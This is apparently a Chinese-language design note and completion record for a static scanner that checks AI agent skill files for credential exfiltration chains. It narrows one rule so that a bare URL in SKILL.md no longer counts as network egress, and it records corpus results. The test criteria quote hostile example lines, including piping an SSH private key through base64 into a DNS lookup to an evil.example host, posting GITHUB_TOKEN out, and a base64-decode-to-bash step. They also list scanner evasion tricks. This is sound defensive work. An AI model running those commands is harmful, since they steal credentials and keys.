<!-- SPDX-License-Identifier: MIT -->
# 012 — SKILL.md 里一个 URL 字面量就算"出网",配置示例被判成外泄链

- **来源**:plan §3.1 第 1 步(2026-09-21);W-026 的语料实测版。首轮 `make bench` 良性误报 219 个里 EXFIL-001/003 占 144
- **依赖**:无(P-011 的 `make bench` 用来验收)
- **分支**:`p/012-instruction-url-literal`

## 问题

外泄链的网络腿 `networkRE` 有两半:真实的出站动作(`curl`、`wget`、`fetch(`、`requests.`、`urllib`、隐蔽信道工具)和一个兜底
`https?://` —— 任何 URL 字面量都算出网。兜底在**脚本**里是对的:`client.post(URL)` 的客户端可能不在动词表里,URL 字面量是
唯一能看见的那一半。但 `SKILL.md`/`CLAUDE.md` 是 `roleInstruction`,跑全部规则,而它恰恰是全树里**最爱写"如何配置某个 API"**
的文件:一行 `"Authorization": "Bearer ${API_TOKEN}"`,隔几行一个 `https://api.example.com/v1`,两条腿凑齐,`EXFIL-001` high。

语料实测(3,220 个真实良性文件,阈值 high):186 条 EXFIL-001/003 命中里 **137 条的网络腿只是文档里的 URL 字面量**,没有任何
出站动作;恶意侧 30 条里 23 条有真实调用。按样本 verdict 算:

| 候选 | 良性翻回 | hard-neg | 恶意丢失 |
|---|---:|---:|---|
| **A** 指令文件里网络腿必须是真实出站动作 | **60**(219 → 159,4.9%) | 0 | 2:两个 netcode 样本,标签是 `\| base64 -D \| bash` 执行,外泄链命中是"判对了理由错",第 3 步(解码后再扫)收回 |
| W-026 候选 1:围栏内代码按 doc 处理 | 约 80 条命中 | — | **13 条恶意命中在围栏里**(规避矩阵的 payload 全在 ```` ```bash ```` 里),不可接受 |
| B 凭证腿是占位符则不算 | 71(松) → **1**(窄) | 0 | 松的定义把 `${TOKEN}` 和脱敏标记算成占位符,那正是真实脚本读凭证的写法;收窄到 `<your-api-key>`/`xxx`/`REPLACE_ME` 只剩 1 个。**放弃** |

剩下的 159 个里 EXFIL-001 还有 78 个,形状是 `Bearer ${GITHUB_TOKEN}` 加一条真实 `curl https://api.github.com/…`:凭证发给它自己的服务。
静态在这一步分不开,归 plan §3.1 第 4 步"目的地一致性"。

## 初步方向

网络腿拆成两个正则:`networkActionRE`(现有 `networkRE` 去掉 `https?://` 那个 alternative)和 `urlLiteralRE`(`https?://`)。
`chain.observe` 增加一个 role 参数:`roleScript` 两者都算(行为不变);`roleInstruction` 只算前者。`netOffBox`/回环判断只在算作腿的行上做。
跨文件的 `EXFIL-002` 用同一条腿,自然一致。不加规则 ID,不动 severity,`docs/rules.md` 里 EXFIL-001 的一句 Why 补半句。

## 完成的判据

- [ ] `TestDetect_InstructionURLLiteralIsNotEgress`(新,表驱动):`SKILL.md` 里 `"Authorization": "Bearer ${API_TOKEN}"` 加
  `https://api.example.com/mcp`(W-026 原样)→ 无 EXFIL-001/002/003;同内容放进 `run.sh` → **仍** EXFIL-001(脚本兜底不变);
  `SKILL.md` 里 `curl -H "Authorization: Bearer $TOKEN" https://c.example/u` → **仍** EXFIL-001(真实调用);
  `SKILL.md` 里 `cat ~/.ssh/id_rsa | base64 | dig $(…).evil.example` → **仍** EXFIL-003(隐蔽信道是动作);
  `SKILL.md` 里 `requests.post("https://c.example", data=os.environ["GITHUB_TOKEN"])` → **仍** EXFIL-001。
- [ ] 反向断言:现有 `TestDetect_ExfilChain`、`TestDetect_ExfilChainLoopback`、`TestDetect_CredentialLegShellEnvDump`、
  `TestDetect_CredentialLegCredentialFiles`(P-010 的 17 个正例,payload 都在 SKILL.md 围栏里)一字不改仍绿。
- [ ] 语料对照(`make bench` 前后 diff):良性 `malicious→benign` **≥ 55**;恶意 `malicious→benign` **≤ 2 且只能是那两个 netcode**;
  规避矿阵 8 个变体的 verdict 不变;hard-negative 不变;127 uncovered 不变。
- [ ] 真机 `scan --root ~/.claude` 修前后完全相同(8 个 high 全是自测插件,无一是文档示例,已核)。
- [ ] `make docs` 后 `docs/rules.md` 只有 EXFIL-001 Why 那半句的改动;`make verify` 绿。

## 不做什么

- 不动凭证腿、编码腿、`cmdPos`、任何 severity;不加规则 ID。
- 不把围栏内代码降级为 doc(候选 1),不做占位符识别(候选 B),理由在上表。
- 不碰 `EXEC-001` 在安装文档里的 21 个 `curl | sh`:agent 真会照着跑,那是真信号(plan §3.1 已定)。
- 不碰 `MCP-001` 在工具目录上的 20 个:不同收集器、不同规则,另开 P-013。
- 不碰脚本里的 URL 字面量兜底。
- 不改 corpus 仓,不改 runner。

## 不能说什么

- 不写"降低了误报"或"修复了 W-026"。按 W-026 自己的口径写:**一条 high 规则在最常见的良性形状(文档里的示例)上系统性误判**,
  这次收窄的是"URL 字面量在指令文件里算出网"这一个判断。
- 数字按来源、带 n、写阈值 high 与信誉库关闭;219 → 159 是这批语料上的计数,不是对外的误报率。
- 剩余 78 个 `Bearer ${TOKEN}` 集成示例**不是**这次修的,要写明归第 4 步。

## 工作项

| W | 一句话 | 提交信息 |
|---|---|---|
| 1 | 表驱动测试先红:指令文件 URL 字面量不成链,脚本、真实调用、隐蔽信道三个反向断言 | `detect: tests — a URL literal in an instruction file is not an outbound action (P-012)` |
| 2 | 网络腿拆两半,`observe` 带 role;`gen-rules` 的 EXFIL-001 Why 补半句,`make docs` | `detect: instruction files need a real outbound action for the exfil chain's network leg (P-012)` |
| 2b | 语料对照暴露回归:规避矩阵 `line-continuation` 以前靠 URL 字面量误打误撞拦下;补上本该有的机制——Markdown 指令文件里 shell 围栏内做行连接,且行连接按 shell 语义(`cur\`+`l` = `curl`,旧实现插空格) | `detect: shell fences in instruction files join continuations, and a continuation joins like the shell does (P-012)` |
| 3 | spec 与 detect.md 各同步一句;bench 前后与真机头部写进 proposal | `docs: spec and detect note the network leg split; corpus before/after recorded (P-012)` |

## 未决问题

每条带建议答案。

**已决(2026-09-21)**:领导对五条全部按建议答案同意 —— 1 只收 `roleInstruction`;2 不算腿的 URL 字面量不参与回环判断;3 补 Why 半句;4 两个 netcode 不在本条补救;5 阈值 ≥ 55。MCP-001 另开 P-013。

1. **`roleInstruction` 之外要不要也收?** `roleDoc` 本来不跑链;`roleToolDesc` 不跑链;`roleHookCmd` 是 settings 里的 hook 命令行,
   一条命令里出现 URL 字面量几乎必然是 `curl`,已被动作半边覆盖。建议:**只收 `roleInstruction`**,其余不动。
2. **回环判断怎么处理?** 现在每条网络行都参与 `netOffBox`(任一非回环目标 → 链保持 high)。URL 字面量在指令文件里不算腿了,
   它还要不要参与"目标是否都在本机"的判断?建议:**不参与**——它不是腿,就不该影响腿的定性;真实调用行自己带 host。
3. **Why 文案。** EXFIL-001 现写 "makes an outbound request"。建议补:"In SKILL.md and CLAUDE.md a bare URL is documentation,
   not a request; the network leg there needs an actual client call or covert-channel tool."
4. **两个 netcode 样本丢失要不要在本条里补救?** 它们的真实形状是 `| base64 -D | bash`,属于第 3 步。建议:**不补**,
   在验收里点名为预期丢失,第 3 步的判据里写"收回"。
5. **验收阈值 55 而不是 60。** 我的估算脚本用 snippet 近似归一化,引擎实测可能差几个。建议:**≥ 55**,实测数写进「完成」。


### 实现阶段记录(2026-09-21)

**第一版 W2 的对照**:良性 `malicious→benign` 43,恶意丢 1 —— 不是预期的两个 netcode(它们没丢:文件里另有真实调用行),
而是规避矩阵的 `line-continuation`。查明两件事:

1. **43 而不是 ≥ 55**:估算脚本只看被引用的最近一对证据行;实际有 17 个文件在别处还有一条真实 `curl` 示例,链照样成立。
   代码行为正确,估算方法错。判据的 55 达不到,实测 43 写进「完成」。
2. **`line-continuation` 丢失是真回归**:SKILL.md 是 `langNone`,围栏里 `cur\`+换行+`l …` 不做行连接,以前是第二行的 URL 字面量当了网络腿。
   而且即使做行连接,旧实现在接缝处固定插一个空格,`cur\`+`l` 变成 `cur l`,与 shell 不一致。W2b 两处都修:shell 围栏内做行连接;
   行连接按 shell 语义。`TestLogicalLines_ShellFenceJoinsContinuations` 钉住围栏内接、围栏外不接、json 围栏不接、围栏结束行不接。

**W2b 后**(`make bench`,阈值 high,信誉库关,inbox 关,HOME 隔离;基线是 dev @ P-011 合入后):

```
良性 malicious→benign 43(219 → 176,5.5%)· 恶意无变化(71 → 71,两个 netcode 仍被拦)· hard-negative 4 不变 · uncovered 127 不变
规避矩阵 8 个:plain/blank-padding/line-continuation/quote-splitting/zero-width/unicode-confusable 拦下,base64-wrapper/split-across-files 按设计仍漏,与修前完全一致
corpus score 良性侧:skillmd-138k 133 → 93(7% → 5% [4,6])· skillet-wild 26 → 23 · automatelab 22 不变 · harvested 35 不变
真机 scan --root ~/.claude:overall 69,high 8 / medium 29 / low 8 与修前相同;artifacts 46 → 47 是 ~/.claude 下新出现了一个文件,与本改动无关
```

**顺带发现,不在本条范围**:剩余 176 个良性误报里,约 60 条 EXFIL-001 落在 `.mcp.json`(synthetic unit,`roleScript`),形状全是
`"headers": {"Authorization": "Bearer ${TOKEN}"}` 加 `"url": "https://…"` —— 远程 MCP 服务器的标准鉴权配置,token 发给它自己的服务器是
配置的定义本身。这是比本条更大的一块,建议 P-014 单独处理(它需要回答"url 指向陌生 host 时算什么",不是简单去掉腿)。
另外 `harvested` 的 35 个一个都没动,说明真实 settings/.mcp.json 上的误报和 SKILL.md 文档示例是两回事。

判据对照:新测试 8 用例绿 + 词法单测绿;四条反向断言未改仍绿;良性翻回 43(**判据 ≥ 55 未达,原因见上**);恶意丢 0(判据 ≤ 2 ✓,且优于判据);
规避矩阵不变 ✓;hard-negative、uncovered 不变 ✓;真机 high 不变 ✓;`docs/rules.md` 只有 EXFIL-001 Why 半句 ✓。


## 完成

```
合入:PR #11 https://github.com/basdotio/agent-guard/pull/11(2026-09-21;sha 合入后用 git log --grep P-012 找)
发布:v0.11.0
证据:TestDetect_InstructionURLLiteralIsNotEgress(8 用例)、TestLogicalLines_ShellFenceJoinsContinuations(internal/detect);
      语料 make bench 阈值 high:良性误报 219 → 176(翻回 43,判据写的 ≥ 55 未达,是估算方法错——见「实现阶段记录」),
      恶意 71 → 71(丢 0),规避矩阵 8 个 verdict 不变,hard-negative 4 → 4,uncovered 127 不变;
      skillmd-138k 133/1996 → 93/1996;真机 scan --root ~/.claude high 8 → 8;
      反向断言:TestDetect_ExfilChain、P-010 的 17 个围栏内正例仍 EXFIL-001/003 high;run.sh 里 token + URL 字面量仍成链
```
